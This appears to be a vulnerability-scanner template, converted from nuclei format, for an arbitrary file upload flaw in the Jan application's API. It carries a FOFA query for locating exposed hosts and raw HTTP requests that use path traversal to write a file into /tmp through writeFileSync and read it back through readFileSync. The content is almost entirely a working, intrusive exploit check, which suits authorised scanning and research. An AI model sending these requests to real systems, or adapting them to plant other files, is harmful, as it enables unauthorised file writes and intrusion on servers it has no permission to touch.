@@ -1,0 +1,153 @@
+{
+  "id": "jan-file-upload",
+  "name": "Jan - Arbitrary File Upload",
+  "author": "pussycat0x",
+  "severity": "HIGH",
+  "description": "Jan\u0027s API interface writeFileSync and appendFileSync does not filter parameters, resulting in an arbitrary file upload vulnerability.\n",
+  "references": [
+    "https://github.com/wy876/POC/blob/main/Jan%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md",
+    "https://github.com/HackAllSec/CVEs/blob/81e63ae5caae40be47905adae601e0c2f480190b/Jan%20Arbitrary%20File%20Upload%20vulnerability/README.md"
+  ],
+  "tags": [
+    "jan",
+    "intrusive",
+    "file-upload"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "icon_hash\u003d\"-165268926\""
+  },
+  "variables": {
+    "string": [
+      "{{to_lower(rand_base(5))}}"
+    ]
+  },
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /v1/app/writeFileSync HTTP/1.1\nHost: {{Hostname}}\ncontentType: application/json\nContent-Type: text/plain;charset\u003dUTF-8\nOrigin: {{RootURL}}\n\n[\"/../../../../../tmp/{{string}}.txt\",\"{{randstr}}\"]\n",
+        "POST /v1/app/readFileSync HTTP/1.1\nHost: {{Hostname}}\ncontentType: application/json\nContent-Type: text/plain;charset\u003dUTF-8\nOrigin: {{RootURL}}\n\n[\"file:/../../../../../tmp/{{string}}.txt\",\"utf-8\"]\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body_2",
+          "values": [
+            "{{randstr}}"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "content_type_2",
+          "values": [
+            "text/plain"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "jan-file-upload",
+    "info": {
+      "name": "Jan - Arbitrary File Upload",
+      "author": "pussycat0x",
+      "severity": "high",
+      "description": "Jan\u0027s API interface writeFileSync and appendFileSync does not filter parameters, resulting in an arbitrary file upload vulnerability.\n",
+      "reference": [
+        "https://github.com/wy876/POC/blob/main/Jan%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md",
+        "https://github.com/HackAllSec/CVEs/blob/81e63ae5caae40be47905adae601e0c2f480190b/Jan%20Arbitrary%20File%20Upload%20vulnerability/README.md"
+      ],
+      "metadata": {
+        "max_request": 2,
+        "fofa_query": "icon_hash\u003d\"-165268926\""
+      },
+      "tags": "jan,intrusive,file-upload"
+    },
+    "variables": {
+      "string": "{{to_lower(rand_base(5))}}"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /v1/app/writeFileSync HTTP/1.1\nHost: {{Hostname}}\ncontentType: application/json\nContent-Type: text/plain;charset\u003dUTF-8\nOrigin: {{RootURL}}\n\n[\"/../../../../../tmp/{{string}}.txt\",\"{{randstr}}\"]\n",
+          "POST /v1/app/readFileSync HTTP/1.1\nHost: {{Hostname}}\ncontentType: application/json\nContent-Type: text/plain;charset\u003dUTF-8\nOrigin: {{RootURL}}\n\n[\"file:/../../../../../tmp/{{string}}.txt\",\"utf-8\"]\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body_2",
+            "words": [
+              "{{randstr}}"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "content_type_2",
+            "words": [
+              "text/plain"
+            ],
+            "case_insensitive": false
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
